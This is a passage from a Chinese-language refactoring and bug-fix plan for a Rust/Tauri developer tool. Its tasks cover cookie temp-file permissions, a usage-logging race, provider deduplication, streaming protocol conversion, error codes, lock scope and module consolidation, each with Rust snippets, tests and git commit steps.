**Files:**
- Modify: `src-tauri/src/commands/cookie_extractor.rs:536-546`（`read_cookies` 临时文件复制）

**问题（自检补充）：** 临时文件使用固定名 `/tmp/devnexus_cookies/cookies_{pid}.sqlite`、默认权限 0644（同机其他用户可读浏览器 Cookie 数据），崩溃后残留。审计报告中等风险项。

- [ ] **Step 1: 随机文件名 + 0600 权限**

将 `read_cookies` 的临时文件创建改为：

```rust
    let tmp_dir = std::env::temp_dir().join("devnexus_cookies");
    let _ = std::fs::create_dir_all(&tmp_dir);
    // 随机文件名（pid + 时间戳），避免固定名被预测/复用
    let tmp_path = tmp_dir.join(format!(
        "cookies_{}_{}.sqlite",
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0)
    ));
    // 删除残留文件（原有逻辑保留）
    let _ = std::fs::remove_file(&tmp_path);
    // ...（原有 wal/shm/journal 清理不变）

    std::fs::copy(path, &tmp_path)
        .map_err(|e| format!("Failed to copy cookie database: {} (path: {:?})", e, path))?;

    // 复制后收紧权限（Unix）：0600，防止同机其他用户读取
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&tmp_path, std::fs::Permissions::from_mode(0o600));
    }
```

- [ ] **Step 2: 用完即删（成功与失败路径）**

用 RAII guard 保证 `read_cookies` 返回时（无论成功/失败）删除临时文件及辅助文件，替换当前仅开头清理的做法：

```rust
struct TempCookieCleanup(PathBuf);
impl Drop for TempCookieCleanup {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.0);
        let _ = std::fs::remove_file(self.0.with_extension("sqlite-wal"));
        let _ = std::fs::remove_file(self.0.with_extension("sqlite-shm"));
        let _ = std::fs::remove_file(self.0.with_extension("sqlite-journal"));
    }
}
```

在 `read_cookies` 创建 `tmp_path` 后立即 `let _cleanup = TempCookieCleanup(tmp_path.clone());`（借用生命周期覆盖整个函数体）。注意辅助文件实际名为 `Cookies-wal` 等拼接后缀，清理时一并处理（实现时对照第 549-554 行注释中的实际命名）。

- [ ] **Step 3: 添加回归测试**

```rust
#[cfg(unix)]
#[test]
fn test_cookie_tmp_permissions() {
    use std::os::unix::fs::PermissionsExt;
    // 调用 read_cookies 的临时文件创建逻辑（或提取 create_cookie_tmp 纯函数）
    // 断言复制后文件权限 mode & 0o777 == 0o600
}
```

若复制逻辑不易直接单测，抽取 `fn create_cookie_tmp_copy(src: &Path) -> Result<PathBuf, String>` 纯函数并测试其权限与清理。

- [ ] **Step 4: 验证 + Commit**

```bash
cargo test --manifest-path src-tauri/Cargo.toml cookie
cargo check --manifest-path src-tauri/Cargo.toml
git add -A && git commit -m "fix: Cookie 临时文件随机名、0600 权限与 RAII 清理 (S10)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 1.11：Phase 1 收尾验证

- [ ] **Step 1: 全量验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && \
cargo test --manifest-path src-tauri/Cargo.toml && \
./node_modules/.bin/svelte-check
```
Expected: 全部通过，测试数较基线 162 增加（新增 S1/S4/S5/S6/S8/S9 回归测试）。

- [ ] **Step 2: 确认 9 项安全修复全部落地**

逐项核对：S1 注入校验、S2 CORS 白名单、S3 哈希比对、S4 rc 校验、S5 路径校验、S6 边界匹配+安全删除、S7 keyring feature、S8 迭代数上限+内存清理、S9 docker 白名单+超时。任何一项未落地则补做。

---

## Phase 2：正确性修复

**目标：** 修复审查发现的功能失效与竞态问题（API Hub 统计丢失、协议转换契约、Provider 持久化一致性、流式去重、错误码语义、锁粒度）。每项修复附带回归测试或对既有 e2e 测试的扩展。

### Task 2.1：usage 统计竞态 — INSERT 与 UPDATE 顺序

**Files:**
- Modify: `src-tauri/src/api_hub/usage.rs:35-90`（`log_request` / `update_log_tokens`）

**问题：** `log_request` 的 INSERT 是 fire-and-forget `spawn_blocking`（未 await），流结束后 `update_log_tokens` 的 UPDATE 可能先于 INSERT 提交 → 匹配 0 行，流式 token 统计永久丢失（已核实代码）。

- [ ] **Step 1: log_request 改为 await 完成**

将 `log_request` 中的 `tokio::task::spawn_blocking(...)` 改为 await 并检查错误：

```rust
    // 持久化到 SQLite（await 完成，保证后续 UPDATE 一定晚于 INSERT）
    let db = state.db.clone();
    let log_clone = log.clone();
    tokio::task::spawn_blocking(move || {
        let db_guard = db.blocking_lock();
        if let Some(ref conn) = *db_guard {
            if let Err(e) = conn.execute(
                "INSERT INTO request_logs (id, provider_id, provider_name, model, request_model,
                 input_tokens, output_tokens, latency_ms, status_code, error_message, timestamp, is_streaming)
                 VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12)",
                rusqlite::params![
                    log_clone.id,
                    log_clone.provider_id,
                    log_clone.provider_name,
                    log_clone.model,
                    log_clone.request_model,
                    log_clone.input_tokens as i64,
                    log_clone.output_tokens as i64,
                    log_clone.latency_ms as i64,
                    log_clone.status_code,
                    log_clone.error_message,
                    log_clone.timestamp,
                    log_clone.is_streaming as i32,
                ],
            ) {
                eprintln!("[API Hub] Failed to insert request log: {}", e);
            }
        }
    })
    .await;
```

`update_log_tokens` 保持 await 不变（已 await），但同样将 `let _ =` 改为记录错误。`capture_usage_stream`/调用链已 await `update_log_tokens`，确认无遗漏。

- [ ] **Step 2: 添加 e2e 回归测试**

在 `api_hub/e2e_tests.rs` 增加：发起一次流式 chat 请求 → 等待流结束 → 调用 `get_logs`/`get_usage_stats`，断言该请求日志的 `output_tokens > 0`（此前会丢失）。若 e2e 中已有流式用例，在其断言后追加日志断言。

- [ ] **Step 3: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml e2e_
```
Expected: 全部 PASS。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: API Hub 用量统计竞态，流式 token 不再丢失 (C1)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.2：Provider 重名检查先于 INSERT + DB 唯一约束

**Files:**
- Modify: `src-tauri/src/api_hub/provider.rs:15-46`（`add_provider`）
- Modify: `src-tauri/src/api_hub/provider.rs`（`init_db_sync` 建表处）

**问题：** `add_provider` 先 INSERT DB、后做内存重名检查，重名时返回 Err 但 DB 已插入；重启后重复 Provider 复活（已核实代码）。DB 无 name 唯一约束。

- [ ] **Step 1: 重名检查前置**

将 `add_provider` 改为：先检查内存 `providers` 是否已存在同名（含大小写不敏感比较），存在则直接返回 Err；再 INSERT DB；DB 成功后 push 内存：

```rust
    // 1) 内存重名检查（先于 DB 写入，保证失败无副作用）
    {
        let providers = state.providers.read().await;
        if providers
            .iter()
            .any(|p| p.name.eq_ignore_ascii_case(&provider.name))
        {
            return Err(format!("Provider '{}' already exists", provider.name));
        }
    }
    // 2) 持久化到 SQLite
    // ...（原 INSERT 逻辑不变）
    // 3) 更新内存
    let mut providers = state.providers.write().await;
    providers.push(provider);
    Ok(())
```

- [ ] **Step 2: DB 加唯一索引**

在 `init_db_sync` 建表语句后添加（幂等，用 `CREATE UNIQUE INDEX IF NOT EXISTS`）：

```sql
CREATE UNIQUE INDEX IF NOT EXISTS idx_providers_name_unique ON providers(name);
```

若存在历史重复数据导致建索引失败，先 `DELETE FROM providers WHERE id NOT IN (SELECT MIN(id) FROM providers GROUP BY lower(name))` 去重，再建索引。

- [ ] **Step 3: 添加回归测试**

在 `api_hub` 测试（或 e2e）添加：连续两次 `add_provider` 同名 → 第二次返回 Err，且 `list` 中只有一条；重启模拟（重新 `load_providers_from_db_sync`）后仍只有一条。

- [ ] **Step 4: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml api_hub
```
Expected: PASS。

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "fix: Provider 重名检查前置 + DB 唯一约束 (C2)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.3：协议转换方向契约错误

**Files:**
- Modify: `src-tauri/src/api_hub/server.rs:375-397`（`determine_stream_direction`）
- Modify: `src-tauri/src/api_hub/router.rs`（相关端点分发）

**问题：** (Anthropic→OpenAIResponses) 返回 `AnthropicToOpenAIChat`、(Responses→Anthropic) 返回 `ResponsesToOpenAIChat`，客户端请求 /v1/responses、/v1/messages 却收到 `chat.completion.chunk` 流（注释自认 "close enough"）——协议契约被破坏（已核实代码）。

- [ ] **Step 1: 明确不支持组合返回错误**

将两个错误映射分支改为返回显式错误（由调用方转为 501/422），不再静默降级：

```rust
        // Provider is Anthropic, Client wants Responses
        (ApiProtocol::Anthropic, ApiProtocol::OpenAIResponses) => {
            return Err(format!(
                "Streaming conversion Anthropic -> OpenAI Responses is not supported"
            ));
        }
        // Provider is Responses, Client wants Anthropic
        (ApiProtocol::OpenAIResponses, ApiProtocol::Anthropic) => {
            return Err(format!(
                "Streaming conversion OpenAI Responses -> Anthropic is not supported"
            ));
        }
```

同时将 `determine_stream_direction` 返回类型改为 `Result<StreamDirection, String>`（或 `Option` + 调用方处理），调用处对 Err 返回 HTTP 501/422 而非 500。非流式（非 SSE）路径若已有完整转换可保留，计划只改流式方向映射。

- [ ] **Step 2: 更新既有测试**

`e2e_tests.rs` 中若存在 `e2e_streaming_cross_protocol_openai_to_anthropic` 等依赖这两个降级映射的测试：保留（OpenAI→Anthropic 方向不受影响）；为 Anthropic→Responses 方向新增断言：返回 501 且带错误信息。

- [ ] **Step 3: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml e2e_
```
Expected: PASS。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: 协议转换方向显式报错，不再静默降级 (C3)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.4：流式转换重复 message_delta/message_stop

**Files:**
- Modify: `src-tauri/src/api_hub/transform/streaming.rs:60-78, 140-163`

**问题：** OpenAI Chat→Anthropic 时 finish_reason chunk 已发 message_delta/message_stop 并重置 `content_block_opened`，随后 [DONE] 又重复发一次 → 客户端收到重复事件。

- [ ] **Step 1: 用状态位去重**

在 `[DONE]` 处理分支前检查"是否已发送过停止事件"标志（如 `stop_sent: bool` 字段或局部变量）：已发送则 [DONE] 直接透传不重复构造 message_stop；未发送才补发。找到 `streaming.rs` 中构造 `message_delta`/`message_stop` 的两处（finish_reason 分支与 [DONE] 分支），统一由同一状态控制。

- [ ] **Step 2: 添加单元测试**

在 `transform/streaming.rs` 测试模块：喂入一段含 finish_reason 的 OpenAI chunk 序列 + 结尾 [DONE]，断言输出中 `message_stop` 恰好出现 1 次、`message_delta` 的 finish_reason 只出现 1 次。

- [ ] **Step 3: 验证**

```bash
cargo test --manifest-path src-tauri/Cargo.toml streaming
cargo test --manifest-path src-tauri/Cargo.toml e2e_
```
Expected: PASS。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: 流式转换重复停止事件去重 (C4)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.5：错误码语义与启动 panic

**Files:**
- Modify: `src-tauri/src/api_hub/server.rs:139-148`（客户端输入错误返 500）
- Modify: `src-tauri/src/api_hub/mod.rs:59`（`.expect("Failed to create HTTP client")`）

**问题：** 客户端格式转换失败返回 500（应 400 系）；启动时 HTTP client 创建失败直接 panic。

- [ ] **Step 1: 错误码区分客户端/服务端错误**

找到 `server.rs` 中把转换失败映射为 500 的位置（第 139-148 行附近），将「输入格式/模型/协议错误」映射为 `StatusCode::BAD_REQUEST`（400）或 `UNPROCESSABLE_ENTITY`（422），仅上游请求失败保留 5xx。检查 `fetch_models`、`list_models` 等处理函数是否同样混淆，一并修正。

- [ ] **Step 2: 启动 expect 降级**

将 `mod.rs:59` 的 `.expect("Failed to create HTTP client")` 改为 `unwrap_or_else` 降级（用 `reqwest::Client::new()` 兜底）并 `eprintln!` 警告，避免启动即 panic：

```rust
    let http_client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(60))
        .build()
        .unwrap_or_else(|e| {
            eprintln!("[API Hub] Failed to build HTTP client, using default: {}", e);
            reqwest::Client::new()
        });
```

- [ ] **Step 3: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml
cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 编译通过，测试全绿。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: API Hub 错误码语义修正与启动降级 (C5)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.6：update_provider 空 key 覆盖与 api_key 明文存储

**Files:**
- Modify: `src-tauri/src/api_hub/provider.rs:66-103`（`update_provider`）
- Modify: `src-tauri/src/api_hub/provider.rs`（INSERT/SELECT 的 api_key 列）

**问题：** `update_provider` 中 api_key 为空串时会覆盖真实 key（现有 `••••` 掩码判断已部分处理，需覆盖空串场景）；对不存在的 id 静默返回 Ok。api_key 明文存 SQLite。

- [ ] **Step 1: 空 key 视为保留原值 + 不存在 id 报错**

在 `update_provider` 中：若 `provider.api_key.is_empty()` 或含 `••••`，从 DB/内存取原 key 保留；UPDATE 影响行数为 0 时返回 `Err("Provider not found")`。

- [ ] **Step 2: api_key 加密存储（可选，若工作量可控）**

用 `password_manager` 已有的 AES-GCM 能力或 `ring`/`aes-gcm` 对 api_key 加密后落库，读取时解密。若引入复杂度过高，至少将日志/错误输出中的 api_key 打码（`get_logs` 返回内容不含 api_key 字段即可）。优先级低于其他任务，可标记为 P2 延后项，但明文存储问题必须在计划中显式记录。

- [ ] **Step 3: 添加回归测试**

```rust
#[test]
fn test_update_provider_preserves_key_on_empty() {
    // add provider with key "secret123" → update with empty key → key 仍为 "secret123"
}
```

- [ ] **Step 4: 验证 + Commit**

```bash
cargo test --manifest-path src-tauri/Cargo.toml api_hub && cargo check --manifest-path src-tauri/Cargo.toml
git add -A && git commit -m "fix: Provider 更新空 key 保留与不存在 id 报错 (C6)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.7：锁粒度 — process_ports / system 全局锁内跑子进程

**Files:**
- Modify: `src-tauri/src/commands/process_ports.rs:301-320`（`sys().with()` 内 spawn 子进程）
- Modify: `src-tauri/src/commands/system.rs:126-151`（锁内磁盘枚举）
- Modify: 两文件 `.lock().unwrap()` 处

**问题：** `sys().with()` 临界区内执行 `refresh_processes(All)` 并 spawn lsof/ss/netstat 子进程；system.rs 锁内做磁盘枚举；`.lock().unwrap()` 中毒即 panic。

- [ ] **Step 1: 缩小临界区**

在 `process_ports.rs`：把 `sysinfo::System::new_all()` 的进程信息收集移出 `with()` 临界区（先收集到局部 Vec，再在临界区内只做内存更新）；子进程调用（lsof/ss/netstat）移到锁外。`system.rs`：磁盘枚举结果先算好，再进锁更新缓存。

- [ ] **Step 2: 替换 unwrap**

将所有 `.lock().unwrap()` 改为 `match`/`unwrap_or_else` 返回错误（命令层为 `Result<_, String>`，中毒时返回 `Err("internal lock poisoned")`），消除 panic 路径。

- [ ] **Step 3: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml
cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 编译通过，测试全绿。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "fix: 缩小系统信息/进程管理锁临界区并消除 unwrap (C7)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.8：join_path 无边界子串匹配

**Files:**
- Modify: `src-tauri/src/api_hub/router.rs:54-74`（`join_path`）

**问题（自检补充）：** `endpoint.starts_with(base_last)` 是无边界子串判断，`base=.../api` + `endpoint=/apix/v1` 会被误拼成 `/api/x/v1`；且 `base != "http"` 判断永不生效（base 是完整 URL，比较无意义）。

- [ ] **Step 1: 改为按路径段边界匹配**

```rust
fn join_path(base: &str, endpoint: &str) -> String {
    let base = base.trim_end_matches('/');
    let endpoint = endpoint.trim_start_matches('/');

    // 仅当 endpoint 的第一个路径段与 base 最后一段完全相等时去重（边界匹配）
    if let Some(base_last) = base.rsplit('/').next() {
        if !base_last.is_empty() {
            let first_seg = endpoint.split('/').next().unwrap_or("");
            if first_seg == base_last {
                let rest = &endpoint[base_last.len()..];
                let rest = rest.trim_start_matches('/');
                if rest.is_empty() {
                    return base.to_string();
                }
                return format!("{}/{}", base, rest);
            }
        }
    }
    format!("{}/{}", base, endpoint)
}
```

- [ ] **Step 2: 扩展既有测试**

在 `router.rs` 的 `tests` 模块（第 82 行起）添加：

```rust
#[test]
fn test_join_path_boundary() {
    assert_eq!(
        join_path("https://x.com/api", "v1/models"),
        "https://x.com/api/v1/models"
    );
    assert_eq!(
        join_path("https://x.com/api", "api/v1/models"),
        "https://x.com/api/v1/models" // 整段相等才去重
    );
    assert_eq!(
        join_path("https://x.com/api", "apix/v1/models"),
        "https://x.com/api/apix/v1/models" // 前缀相同但非整段，不再误拼
    );
    assert_eq!(
        join_path("https://x.com", "v1/models"),
        "https://x.com/v1/models"
    );
}
```

- [ ] **Step 3: 验证 + Commit**

```bash
cargo test --manifest-path src-tauri/Cargo.toml join_path
cargo check --manifest-path src-tauri/Cargo.toml
git add -A && git commit -m "fix: 上游 URL 拼接按路径段边界去重 (C8)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.9：fetch_models 复用全局 HTTP client（低优先）

**Files:**
- Modify: `src-tauri/src/api_hub/fetch_models.rs:25-28`

**问题（自检补充）：** 每次拉取模型新建 `reqwest::Client`，未复用 `state.http_client` 连接池（低优先但顺手修复）。

- [ ] **Step 1: 复用全局 client**

检查 `fetch_models.rs` 的函数签名是否接收 `state`/`AppState`；若未接收则补充参数（`&AppState` 或 `&reqwest::Client`），将内部 `reqwest::Client::new()` 改为使用 `state.http_client.clone()`（`AppState` 已有该字段，见 `api_hub/mod.rs` 初始化处）。调用方（`commands.rs` 的 `api_hub_fetch_models`）同步传参。

- [ ] **Step 2: 验证 + Commit**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && cargo test --manifest-path src-tauri/Cargo.toml
git add -A && git commit -m "refactor: fetch_models 复用全局 HTTP client (C9)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 2.10：Phase 2 收尾验证

- [ ] **Step 1: 全量验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && \
cargo test --manifest-path src-tauri/Cargo.toml && \
./node_modules/.bin/svelte-check
```
Expected: 全部通过。

- [ ] **Step 2: 确认 7 项正确性修复全部落地**

逐项核对：C1 统计竞态、C2 重名前置+唯一索引、C3 协议方向报错、C4 流式去重、C5 错误码+启动降级、C6 空 key 保留+api_key 打码、C7 锁粒度+去 unwrap。任何一项未落地则补做。

---

## Phase 3：后端架构分层

**目标：** 消除跨模块重复实现（命令执行、rc 编辑、残留路径表、错误类型），拆分巨型文件，为后续维护建立单一职责边界。此阶段为纯重构：**行为不变**，全程依赖既有测试（162+ 个）与 `cargo check` 守护。

### Task 3.1：统一命令执行器 pm_exec

**Files:**
- Create: `src-tauri/src/utils/exec.rs`（新模块，`utils/mod.rs` 中 `pub mod exec;`）
- Refactor: `src-tauri/src/commands/container.rs:53`（`run_docker`）、`mirror.rs`（`run_cmd`/`run_cmd_any`）、`version_manager.rs`（`run_cmd_any`）、`software.rs`（多处 `Command` 直调）

**问题：** 命令执行封装四处雷同（run_docker / run_cmd / run_cmd_any / get_version），超时、错误归一化、输出编码处理各异。

- [ ] **Step 1: 新建统一执行器**

```rust
// src-tauri/src/utils/exec.rs
use std::process::{Command, Output};
use std::time::Duration;

pub const DEFAULT_TIMEOUT: Duration = Duration::from_secs(120);

/// 统一命令执行：带超时、UTF-8 输出归一化、错误信息结构化
pub struct CmdResult {
    pub stdout: String,
    pub stderr: String,
    pub status: i32,
}

pub fn run(program: &str, args: &[&str], timeout: Duration) -> Result<CmdResult, String> {
    let (tx, rx) = std::sync::mpsc::channel();
    let program_owned = program.to_string();
    let args_owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
    std::thread::spawn(move || {
        let output = Command::new(&program_owned).args(&args_owned).output();
        let _ = tx.send(output);
    });
    let output: std::io::Result<Output> = rx
        .recv_timeout(timeout)
        .map_err(|_| format!("command '{}' timed out after {:?}", program, timeout))?
        .map_err(|e| format!("failed to execute '{}': {}", program, e))?;
    Ok(CmdResult {
        stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
        status: output.status.code().unwrap_or(-1),
    })
}

/// 便捷版：默认超时 + 失败时拼装错误信息
pub fn run_checked(program: &str, args: &[&str]) -> Result<CmdResult, String> {
    let r = run(program, args, DEFAULT_TIMEOUT)?;
    if r.status != 0 {
        return Err(if r.stderr.trim().is_empty() {
            r.stdout.trim().to_string()
        } else {
            r.stderr.trim().to_string()
        });
    }
    Ok(r)
}
```

- [ ] **Step 2: 迁移现有调用**

将 `container.rs` 的 `run_docker`、`mirror.rs` 的 `run_cmd`/`run_cmd_any`、`version_manager.rs` 的 `run_cmd_any` 实现替换为对 `utils::exec::run`/`run_checked` 的薄封装（保持原函数签名与返回类型不变，调用方零改动）：

```rust
// container.rs 替换后
fn run_docker(args: &[&str]) -> Result<(String, String), String> {
    let r = crate::utils::exec::run_checked("docker", args)?;
    Ok((r.stdout, r.stderr))
}
```

逐个迁移，每迁移一个模块运行 `cargo test` 确认无回归（container / mirror / version_manager 相关测试）。

- [ ] **Step 3: 删除被替换的旧实现**

确认所有调用点迁移完成后，删除 container.rs / mirror.rs / version_manager.rs 中不再使用的旧函数与 `use std::process::Command` 相关导入（保留各模块仍直用 `Command` 的少量特殊调用，如 nvm 的 `bash -c`——该处已由 S1 校验保护，迁移时同步改为 `exec::run("bash", &["-c", ...])`）。

- [ ] **Step 4: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 全绿，且 `cargo clippy`（如有配置）无新增警告。

- [ ] **Step 5: Commit**

```bash
git add -A
git commit -m "refactor: 统一命令执行器 pm_exec，消除四处雷同实现 (A1)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 3.2：shell rc 编辑统一为 rc_editor

**Files:**
- Create: `src-tauri/src/utils/rc_editor.rs`（新模块）
- Refactor: `src-tauri/src/commands/mirror.rs:1013-1034`、`src-tauri/src/commands/environment.rs:234-260`、`src-tauri/src/commands/version_manager.rs`（nvm/rustup 环境变量写入处）

**问题：** shell rc 检测与写入逻辑在 mirror / environment / version_manager 三处重复（含 `detect_shell_rc`、重复行替换、去重判断）。

- [ ] **Step 1: 新建 rc_editor 模块**

```rust
// src-tauri/src/utils/rc_editor.rs
use std::path::PathBuf;

/// 检测默认 shell 的 rc 文件
pub fn detect_shell_rc(home: &std::path::Path) -> PathBuf {
    let shell = std::env::var("SHELL").unwrap_or_default();
    let name = if shell.ends_with("zsh") {
        ".zshrc"
    } else if shell.ends_with("bash") {
        ".bashrc"
    } else {
        ".profile"
    };
    home.join(name)
}

/// 在 rc 文件中设置形如 `export KEY="value"` 的行；已存在则替换，否则追加。
/// 返回 (是否发生写入, 提示信息)
pub fn set_export_line(
    home: &std::path::Path,
    key: &str,
    value: &str,
) -> Result<bool, String> {
    crate::utils::validate_rc_value(value)?;
    let rc = detect_shell_rc(home);
    let existing = std::fs::read_to_string(&rc).unwrap_or_default();
    let new_line = format!("export {}=\"{}\"", key, value);
    if existing.lines().any(|l| l.contains(&format!("{}=\"", key))) {
        // 替换已有行
        let updated = existing
            .lines()
            .map(|l| {
                if l.contains(&format!("{}=\"", key)) {
                    new_line.clone()
                } else {
                    l.to_string()
                }
            })
            .collect::<Vec<_>>()
            .join("\n");
        std::fs::write(&rc, format!("{}\n", updated))
            .map_err(|e| format!("Failed to write {}: {}", rc.display(), e))?;
        Ok(true)
    } else {
        let line = format!("\n# DevNexus: {}\n{}\n", key, new_line);
        std::fs::write(&rc, format!("{}{}", existing, line))
            .map_err(|e| format!("Failed to write {}: {}", rc.display(), e))?;
        Ok(true)
    }
}
```

- [ ] **Step 2: 迁移三处调用**

`mirror.rs` 的 `set_brew_mirror` 等、`environment.rs` 的 `add_to_path_impl`、`version_manager.rs` 的环境变量写入改为调用 `rc_editor::set_export_line`（注意：`add_to_path_impl` 的 PATH 行格式为 `export PATH="$PATH:..."`，需在 rc_editor 增加 `set_path_line` 或参数化支持；实现时以 `add_to_path_impl` 现有格式为准保留行为）。迁移后删除各模块重复的 `detect_shell_rc` 与 rc 写入逻辑。

- [ ] **Step 3: 添加单元测试**

在 `rc_editor.rs` 测试模块：用 `tempfile`（dev-dep，Phase 0 已从 Cargo.toml 移除——若需要，重新加回 dev-dependencies）或 `std::env::temp_dir()` 构造临时 HOME，验证：新增行、替换已有行、非法 value 返回 Err。注意 `detect_shell_rc` 依赖 `SHELL` 环境变量，测试中显式设置。

- [ ] **Step 4: 验证 + Commit**

```bash
cargo test --manifest-path src-tauri/Cargo.toml rc_editor && cargo check --manifest-path src-tauri/Cargo.toml
git add -A && git commit -m "refactor: shell rc 编辑统一为 rc_editor 模块 (A2)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 3.3：残留路径表单一数据源

**Files:**
- Modify: `src-tauri/src/commands/software.rs:841-1068`（`get_cleanup_paths`，228 行）
- Modify: `src-tauri/src/residue_scanner/known_paths.rs`（1005 行巨型 match）
- Modify: `src-tauri/src/residue_scanner/mod.rs`

**问题：** `software.rs` 的 `get_cleanup_paths` 与 `known_paths.rs` 平行维护同一份应用路径映射，需手工同步、极易漂移。

- [ ] **Step 1: 确认数据完全一致**

对比 `software.rs:841-1068` 与 `known_paths.rs` 的应用列表与路径规则，确认二者覆盖同一集合（实现时逐项核对）。若 software.rs 有 known_paths 缺失的条目，先补进 known_paths.rs 再删除 software.rs 副本。

- [ ] **Step 2: 删除 software.rs 副本并改为复用**

将 `get_cleanup_paths` 替换为对 `known_paths` 的调用（按需保留 software.rs 特有的返回结构，从 known_paths 结果映射）。确保 `force_uninstall_software`、`scan_app_residues`、`clean_specific_residues` 的调用链不破坏。

- [ ] **Step 3: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 全绿（residue_scanner 与 software 相关测试全部通过）。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "refactor: 残留路径表统一到 known_paths 单一数据源 (A3)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 3.4：统一错误类型与错误信息

**Files:**
- Create: `src-tauri/src/utils/error.rs`（`DevNexusError`）
- Refactor: `src-tauri/src/commands/*`（逐步替换 `Result<_, String>` 中的裸字符串错误）

**问题：** 错误以裸 `String` 传递，存在：锁定时 `list_passwords` 返回空 Vec 而非错误、`test_mirror_latency` 用 0 表超时、Cookie 解密占位串、`safe_get_version` 一律返回 "timeout"。

- [ ] **Step 1: 定义统一错误类型**

```rust
// src-tauri/src/utils/error.rs
use thiserror::Error;

#[derive(Debug, Error)]
pub enum DevNexusError {
    #[error("invalid input: {0}")]
    InvalidInput(String),
    #[error("not found: {0}")]
    NotFound(String),
    #[error("operation failed: {0}")]
    Operation(String),
    #[error("permission denied: {0}")]
    Permission(String),
    #[error("internal error: {0}")]
    Internal(String),
}

impl From<DevNexusError> for String {
    fn from(e: DevNexusError) -> Self {
        e.to_string()
    }
}
```

- [ ] **Step 2: 优先修复语义错误的信号**

不要求一次性全量替换（改动面过大、风险高），优先修复审查点名的三处信号错误：
1. `password_manager.rs:445-454` `list_passwords` 锁定时返回 `Err(DevNexusError::Permission("vault is locked"))`，前端可区分"无密码/已锁定"（同步更新前端处理，见 Phase 4）
2. `mirror.rs:659-700` `test_mirror_latency`：区分"未测/超时/失败"，返回结构化结果而非 0/-1 混用
3. `software.rs:154` `safe_get_version`：失败返回具体错误信息而非一律 "timeout"

- [ ] **Step 3: 验证**

```bash
cargo check --manifest-path src-tauri/Cargo.toml && cargo test --manifest-path src-tauri/Cargo.toml
```
Expected: 全绿。前端调用点若因返回结构变化编译失败，先同步最小适配（完整前端错误归一化在 Phase 4）。

- [ ] **Step 4: Commit**

```bash
git add -A
git commit -m "refactor: 引入 DevNexusError 统一错误类型并修复信号错误 (A4)
Co-Authored-By: AtomCode (deepseek-v4-flash) <noreply@atomgit.com>"
```

### Task 3.5：巨型文件拆分

**Files:**
- Split: `src-tauri/src/commands/mirror.rs`（1238 行）→ `mirror.rs`（命令层）+ `mirror_data.rs`（静态镜像源数据，`list_mirrors` 的 535 行）
- Split: `src-tauri/src/commands/cookie_extractor.rs`（1206 行）→ `cookie_extractor.rs`（命令层）+ `cookie_crypto.rs`（解密/密钥提取）
- Split: `src-tauri/src/commands/software.rs`（2269 行）→ 按职责拆为 `software.rs`（命令编排）+ `software_pm.rs`（各包管理器执行）+ `software_data.rs`（`build_software_defs`/`map_package_name`/`GUI_APPS` 静态数据）

**问题：** 巨型文件难维护；静态数据与命令逻辑混在一起；`build_software_defs`（238 行）、`map_package_name`（122 行）、`list_mirrors` 静态数据（535 行）等纯数据应独立。

- [ ] **Step 1: mirror.rs 拆分静态数据**

将 `list_mirrors` 中 535 行静态数据（各镜像源名称/URL/类别/国家）抽到 `mirror_data.rs` 的 `const`/`static` 或 `fn mirrors() -> Vec<MirrorDef>`，`list_mirrors` 只保留命令包装。`cargo check` + mirror 相关测试通过后提交。

- [ ] **Step 2: cookie_extractor.rs 拆分解密逻辑**

将 AES 解密、密钥提取、哈希校验（含 S3 修复后的 `try_aes_128_cbc`）抽到 `cookie_crypto.rs`，命令层只留浏览器发现/路径/导出。cookie 相关测试通过后提交。

- [ ] **Step 3: software.rs 拆分**

